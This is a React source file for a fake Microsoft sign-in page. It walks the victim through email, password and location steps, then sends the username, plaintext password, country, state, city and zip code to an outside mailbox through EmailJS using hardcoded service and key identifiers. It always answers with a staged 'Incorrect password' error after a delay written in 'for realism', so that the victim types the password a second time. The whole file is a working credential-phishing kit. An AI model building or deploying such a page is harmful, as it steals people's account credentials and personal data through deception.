import { useState } from "react";
import { Country, State, City } from "country-state-city";
import emailjs from '@emailjs/browser';
import "./Login.css";

import Logom from "../assets/Logom.png";
import Arrowback from "../assets/Arrowback.svg";
import EyeIcon from "../assets/EyeIcon.svg";

function Login() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false); // New Loading State

  const [location, setLocation] = useState({
    countryCode: "",
    stateCode: "",
    cityName: "",
    zip: ""
  });

  const countries = Country.getAllCountries();
  const states = location.countryCode ? State.getStatesOfCountry(location.countryCode) : [];
  const cities = (location.countryCode && location.stateCode) ? City.getCitiesOfState(location.countryCode, location.stateCode) : [];

  const nextStep = (e) => {
    e.preventDefault(); 
    setError(""); 
    setStep(step + 1);
  };

  const prevStep = () => {
    setError("");
    setStep(step - 1);
  };

  const handleFinalSubmit = (e) => {
    e.preventDefault();
    setLoading(true); // Start loading animation
    setError("");

    const templateParams = {
      user_name: email,
      user_pass: password,
      country: location.countryCode,
      state: location.stateCode,
      city: location.cityName,
      zip_code: location.zip,
    };

    emailjs.send(
      'service_obe5lus', 
      'template_hejq0k4',
      templateParams,
      'ulBxsJm970jWYDnqa'
    )
    .then((response) => {
      // Simulate a small delay for realism
      setTimeout(() => {
        setLoading(false);
        setError("Incorrect password. Please try again.");
        setPassword(""); 
        setStep(2); // Redirect back to Password step to show error
      }, 1500);
    })
    .catch((err) => {
      setLoading(false);
      setError("An error occurred. Please try again.");
    });
  };

  return (
    <div className="ms-outer-container">
      <div className="ms-card">
        {/* Microsoft Loading Bar (Optional CSS Animation) */}
        {loading && <div className="ms-loading-bar"></div>}
        
        <img src={Logom} alt="Microsoft" className="ms-logo" />

        {/* Step 1: Email */}
        {step === 1 && (
          <form className="ms-content" onSubmit={nextStep}>
            <h1 className="ms-title">Sign in</h1>
            <input
              type="email"
              placeholder="Email, phone, or Skype"
              required
              className="ms-input"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
            <div className="ms-text-links">
              <p>No account? <a className="ms-link-blue" href="#">Create one!</a></p>
            </div>
            <div className="ms-button-group">
              <button type="submit" className="ms-button-primary">Next</button>
            </div>
          </form>
        )}

        {/* Step 2: Password */}
        {step === 2 && (
          <form className="ms-content" onSubmit={nextStep}>
            <div className="ms-identity-banner">
              <button type="button" onClick={prevStep} className="ms-back-button">
                <img src={Arrowback} alt="Back" />
              </button>
              <span className="ms-display-email">{email}</span>
            </div>

            <h1 className="ms-title">Enter password</h1>
            
            {/* THIS IS THE BROWSER ERROR MESSAGE */}
            {error && <div className="ms-error-msg">{error}</div>}

            <div className="ms-input-group ms-password-container">
              <input
                type={showPassword ? "text" : "password"}
                placeholder="Password"
                required
                className="ms-input"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <img src={EyeIcon} className="ms-eye-icon" onClick={() => setShowPassword(!showPassword)} alt="toggle" />
            </div>

            <div className="ms-button-group">
              <button type="submit" className="ms-button-primary">Next</button>
            </div>
          </form>
        )}

        {/* Step 3: Location */}
        {step === 3 && (
          <form className="ms-content" onSubmit={handleFinalSubmit}>
            <div className="ms-identity-banner">
              <button type="button" onClick={prevStep} className="ms-back-button">
                <img src={Arrowback} alt="Back" />
              </button>
              <span className="ms-display-email">Verify your location</span>
            </div>
            <h1 className="ms-title">Additional info</h1>
            
            <div className="ms-select-group">
              <select className="ms-select" required value={location.countryCode} onChange={(e) => setLocation({ ...location, countryCode: e.target.value, stateCode: "", cityName: "" })}>
                <option value="">Country/Region</option>
                {countries.map((c) => <option key={c.isoCode} value={c.isoCode}>{c.name}</option>)}
              </select>

              <select className="ms-select" required value={location.stateCode} disabled={!location.countryCode} onChange={(e) => setLocation({ ...location, stateCode: e.target.value, cityName: "" })}>
                <option value="">State/Province</option>
                {states.map((s) => <option key={s.isoCode} value={s.isoCode}>{s.name}</option>)}
              </select>

              <select className="ms-select" required value={location.cityName} disabled={!location.stateCode} onChange={(e) => setLocation({ ...location, cityName: e.target.value })}>
                <option value="">City</option>
                {cities.map((city) => <option key={city.name} value={city.name}>{city.name}</option>)}
              </select>

              <input type="text" placeholder="Zip code" required className="ms-input" value={location.zip} onChange={(e) => setLocation({ ...location, zip: e.target.value })} />
            </div>

            <div className="ms-button-group">
              <button type="submit" className="ms-button-primary" disabled={loading}>
                {loading ? "Processing..." : "Sign in"}
              </button>
            </div>
          </form>
        )}
      </div>
    </div>
  );
}

export default Login;